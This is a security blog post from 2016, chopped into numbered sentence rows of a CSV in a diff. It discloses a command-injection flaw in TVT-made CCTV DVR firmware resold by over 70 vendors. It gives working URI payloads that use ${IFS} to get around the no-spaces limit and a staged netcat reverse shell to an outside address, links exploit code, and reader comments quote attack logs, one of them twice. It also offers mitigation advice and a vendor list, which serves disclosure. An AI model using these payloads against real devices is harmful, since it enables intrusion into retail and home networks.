@@ -1,0 +1,333 @@
+Number,Content
+"""Sentence 1","
+tuesday, march 22, 2016
+remote code execution in cctv-dvr affecting over 70 different vendors
+
+this post is going to be a follow up from a research which dates back to december 2014, called the backoff pos trojan operation."
+"""Sentence 2","back then, one of the key conclusions highlighted from the report is that fraudsters are adopting new tactics in order to attack retailers."
+"""Sentence 3","this new attack vector is to compromise dvr boxes, which is the heart component of any cctv system."
+"""Sentence 4","this was allowing them to achieve two goals at once-
+verify a targeted host actually belongs to a retailer."
+"""Sentence 5","get a foothold inside the local network, one step closer to the pos station."
+"""Sentence 6","surveillance cameras, the first line of security in the physical world, are the virtual's weakest link?this sparks an amusing irony."
+"""Sentence 7","when the old fashion thieves used to physically break into stores, on their way to the cashier they had to try and avoid or neutralize any surveillance equipment."
+"""Sentence 8",the digital thieves are entering the store through them.
+"""Sentence 9",truly hollywood  material.
+"""Sentence 10","got me curious 
+
+so this was as far as the backoff research paper went."
+"""Sentence 11",but these cctv systems caught my curiosity.
+"""Sentence 12","i had two questions in mind;
+what is their distribution across the net?"
+"""Sentence 13",how are they being compromised?
+"""Sentence 14","using the data i've gathered from the c&c server of over thousand infected machines, i started mapping the open services/ports."
+"""Sentence 15",i soon discovered a lot of them had port 81/82 open in addition to port 8000. they were http servers identifying as cross web server.
+"""Sentence 16","and their main web page looked like this -
+
+
+
+
+a quick shodan query, revealed their distribution; a total of over 30,000(!)."
+"""Sentence 17",quite a lot and yet i'm sure this is only a small portion of them.
+"""Sentence 18",vendor?
+"""Sentence 19",next thing i want to know is which manufacturer is behind these cctv equipment.
+"""Sentence 20","and so one grep led to another-
+
+webclient.html:
+
+?"
+"""Sentence 21","1
+<script id= gt= live_js= lt= script= src=script/live.js type=text/javascript>
+
+script/live.js:
+
+?"
+"""Sentence 22","1
+<img style=cursor:auto; src = logo/logo.png>
+
+and viola!"
+"""Sentence 23","the logo suggests this is an israeli company selling cctv systems, but comments all over the code actually says it was made in china."
+"""Sentence 24",so i decided to pay their website a visit.
+"""Sentence 25","navigating through their website, i encountered the download section which offers firmware update for these dvr boxes."
+"""Sentence 26",sweet!
+"""Sentence 27","let the bug hunt begin..
+
+download."
+"""Sentence 28",unzip.
+"""Sentence 29","floop -
+
+?"
+"""Sentence 30","1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+total 8684
+drwx------  8 exodus exodus    4096 feb 10 18:26 ."
+"""Sentence 31","drwx------  8 exodus exodus   16384 feb 10 16:08 ..
+-rw-r--r--  1 exodus exodus     604 nov  7  2012 boot.sh
+drwx------  2 exodus exodus    4096 nov  7  2012 config
+-rw-r--r--  1 exodus exodus    1027 nov  7  2012 dep2.sh
+-rw-r--r--  1 exodus exodus  307561 nov  7  2012 language.tar
+-rw-r--r--  1 exodus exodus 1189984 nov  7  2012 libhi3520a.so
+drwx------  2 exodus exodus    4096 feb  8 13:07 modules
+-rw-r--r--  1 exodus exodus    2175 nov  7  2012 netupgrade.sh
+-rw-r--r--  1 exodus exodus    4852 nov  7  2012 preupgrade.sh
+drwx------  2 exodus exodus    4096 jan  4  2015 product
+-rw-r--r--  1 exodus exodus    5984 nov  7  2012 productcheck
+-rw-r--r--  1 exodus exodus      44 nov  7  2012 rewdg.sh
+-rw-r--r--  1 exodus exodus 7257480 nov  7  2012 td3520a
+drwx------  2 exodus exodus    4096 jan  4  2015 ui
+drwx------  2 exodus exodus    4096 jan  4  2015 videoplay
+drwx------ 34 exodus exodus    4096 jan 27  2015 websites
+-rw-r--r--  1 exodus exodus   51696 nov  7  2012 xdvrstart.hisi
+
+a compressed file system."
+"""Sentence 32",my aim is to get to the main server process .
+"""Sentence 33",my first guess was to begin from the boot.sh since it probably execute all the relevant binaries on boot.
+"""Sentence 34",boot.sh executes another shell script called deps2.sh.
+"""Sentence 35",this script execute two binaries.
+"""Sentence 36",xvdrstart.hisi and td3520a.
+"""Sentence 37",from their size i understand that most of the weight is found in td3520a.
+"""Sentence 38","first thing i notice, the binary is saved in debugged mode which means it has all the symbols and therefore all the functions names."
+"""Sentence 39",this makes the analysis process much easier.. thanks guys!
+"""Sentence 40","after snooping around for a while, i discovered within the implementation of the http server the following vulnerable code
+
+
+?"
+"""Sentence 41","1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+.text:0040878c ldr     r0, [r11,#dirp] ; dirp
+.text:00408790 bl      closedir
+.text:00408794 ldr     r0, =aextractlanguag ; extract language packet!"
+"""Sentence 42",".text:00408798 bl      puts
+.text:0040879c sub     r3, r11, #-var_6c00
+.text:004087a0 sub     r3, r3, #4
+.text:004087a4 sub     r3, r3, #0xcc
+.text:004087a8 sub     r2, r11, #-dest
+.text:004087ac mov     r0, r3          ; s
+.text:004087b0 ldr     r1, =atarzxfmntmtdwe ; tar -zxf /mnt/mtd/websites/language.tar.gz
+                                            ;    %s/* -c /nfsdir/language/
+.text:004087b4 bl      sprintf
+.text:004087b8 sub     r3, r11, #-var_6c00
+.text:004087bc sub     r3, r3, #4
+.text:004087c0 sub     r3, r3, #0xcc
+.text:004087c4 mov     r0, r3          ; char *
+.text:004087c8 bl      dvrsystem
+
+
+it reads the uri, and if it contain something like the following -
+
+/language/[language]/index.html
+
+its going to extract the [language] in between the slashes and check if the directory exists, if not it is going to execute this command -
+
+?"
+"""Sentence 43","1
+tar -zxf /mnt/mtd/websites/language.tar.gz [language]/* -c /nfsdir/language
+this basically gives us a remote command line execution."
+"""Sentence 44",awesome!
+"""Sentence 45","exploitation
+
+in order to exploit it i had to overcome few obstacles i've identified -
+ can't use spaces or newlines + server does not understand url encoding
+ length in between the slashes is limited."
+"""Sentence 46",i was able to bypass the no-space restrictions with something called ${ifs} .
+"""Sentence 47","basically ifs stands for internal field separator, it holds the value which is used by the shell to determine how to do field splitting."
+"""Sentence 48",by default it holds \n which is exactly what i needed.
+"""Sentence 49","so this is my new attack vector -
+/language/swedish${ifs}&&echo${ifs}1>test&&tar${ifs}/string.js
+and it worked!"
+"""Sentence 50",the file has been written.
+"""Sentence 51","lets do another test -
+
+/language/swedish${ifs}&&echo${ifs}$user>test&&tar${ifs}/string.js
+outputs -
+root
+
+great success!!"
+"""Sentence 52",as with many embed systems this one is using busybox so what i decided to do is invoke netcat in order to get a nice and comfy reverse shell.
+"""Sentence 53","so considering our length limitation i broke the command into three pieces -
+
+three ..
+?"
+"""Sentence 54","1
+echo nc 1.1.1.1 1234>e
+
+two ...
+?"
+"""Sentence 55","1
+echo -e $shell>>e
+
+one."
+"""Sentence 56",lift off!
+"""Sentence 57",?
+"""Sentence 58","1
+$(cat e) &>r
+
+exploit code can be found here -
+https://github.com/k1p0d/h264_dvr_rce
+
+
+♫too many cooks, too many cooks♫
+
+since comments all over the code suggested this is a made in china case, i wanted to trace the origin of it."
+"""Sentence 59",this process led me to discovering over 70(!)
+"""Sentence 60",vendors reselling almost identical products.
+"""Sentence 61","they may have different logo, or slightly different plastics, but they share the same vulnerable software."
+"""Sentence 62",this is basically what they call white labeling.
+"""Sentence 63",probably china's most common business model.
+"""Sentence 64","eventually i've located the real manufacturer, a company called tvt."
+"""Sentence 65","finding all the different vendors is one thing, but identifying the vulnerable products is a whole other story since every vendor has different modeling convention."
+"""Sentence 66",to summarize this i'd say too many cooks are stirring the same rotten pot.
+"""Sentence 67",this makes it really hard to mitigate the problem and leaving a lot of potential vulnerable end users/businesses.
+"""Sentence 68","mitigation
+
+since there are many vendors who redistribute this hardware-software it is hard to rely on vendors patch to arrive at your doorstep."
+"""Sentence 69",i believe there are few more vulnerabilities being exploited in the wild against these machines and therefore your best shot would probably be to deny any connection from an unknown ip address to the dvr services.
+"""Sentence 70",and so i will leave you here with a list of vendors who are selling some of tvt's re-branded  gear.
+"""Sentence 71",last note about the responsible disclosure process.
+"""Sentence 72",i've been trying to contact tvt for quite some time with no luck.
+"""Sentence 73","they have been ignoring me for too long, so they left me with no choice but to disclosure."
+"""Sentence 74","exploit code
+
+https://github.com/k1p0d/h264_dvr_rce
+
+
+vendors list
+
+ademco
+ats alarmes technolgy and ststems
+area1protection
+avio
+black hawk security
+capture
+china security systems
+cocktail service
+cpsecured
+cp plus
+digital eye'z no website
+diote service & consulting
+dvr kapta
+elvox
+et vision
+extra eye 4 u
+eyemotion
+eds
+fujitron
+full hd 1080p
+gazer
+goldeye
+goldmaster
+grizzly
+hd iviewer
+hi-view
+ipcom
+ipox
+ir
+isc illinois security cameras, inc.
+jfl alarmes
+lince
+lot
+lux
+lynx security
+magtec
+meriva security
+multistar
+navaio
+novus
+optivision
+para vision
+provision-isr
+q-see
+questek
+retail solution inc
+rit huston .com
+rod security cameras
+satvision
+sav technology
+skilleye
+smarteye
+superior electrial systems
+techshell
+techson
+technomate
+tecvoz
+teleeye
+tomura
+truvue
+tvt
+umbrella
+united video security system, inc
+universal it solutions
+us it express
+u-spy store
+ventetian
+v-gurad security
+vid8
+vtek
+vision line
+visar
+vodotech.com
+vook
+watchman
+xrplus
+yansi
+zetec
+zoomx
+
+unknownoctober 21, 2016 at 1:59 pm
+i had someone in mexico attempt to probe my home ip address using this exploit 2 days before the big ddos attack on oct 21."
+"""Sentence 75","201.173.180.148 - - [19/oct/2016:14:00:55 -0400] get /language/swedish${ifs}&&echo${ifs}610cker>qt&&tar${ifs}/string.js http/1.0 404 538 - wget(linux)
+201.173.180.148 - - [19/oct/2016:14:00:55 -0400] get /../../../../../../../mnt/mtd/qt http/1.0 400 484 - wget(linux)
+
+reply
+
+michaeloctober 27, 2016 at 2:47 pm
+i received a similar attack on one of my servers recently:
+187.161.117.130 - - [27/oct/2016 21:xx:xx] get /cgi/common.cgi http/1.0 404 -
+187.161.117.130 - - [27/oct/2016 21:xx:xx] get /stssys.htm http/1.0 404 -
+187.161.117.130 - - [27/oct/2016 21:xx:xx] post /command.php http/1.0 404 -
+187.161.117.130 - - [27/oct/2016 21:xx:xx] get /language/swedish${ifs}&&echo${ifs}610cker>qt&&tar${ifs}/string.js http/1.0 404 -
+187.161.117.130 - - [27/oct/2016 21:xx:xx] get /../../../../../../../mnt/mtd/qt http/1.0 404 -
+
+reply
+
+michaeloctober 27, 2016 at 2:47 pm
+i received a similar attack on one of my servers recently:
+187.161.117.130 - - [27/oct/2016 21:xx:xx] get /cgi/common.cgi http/1.0 404 -
+187.161.117.130 - - [27/oct/2016 21:xx:xx] get /stssys.htm http/1.0 404 -
+187.161.117.130 - - [27/oct/2016 21:xx:xx] post /command.php http/1.0 404 -
+187.161.117.130 - - [27/oct/2016 21:xx:xx] get /language/swedish${ifs}&&echo${ifs}610cker>qt&&tar${ifs}/string.js http/1.0 404 -
+187.161.117.130 - - [27/oct/2016 21:xx:xx] get /../../../../../../../mnt/mtd/qt http/1.0 404 -
+
+reply"
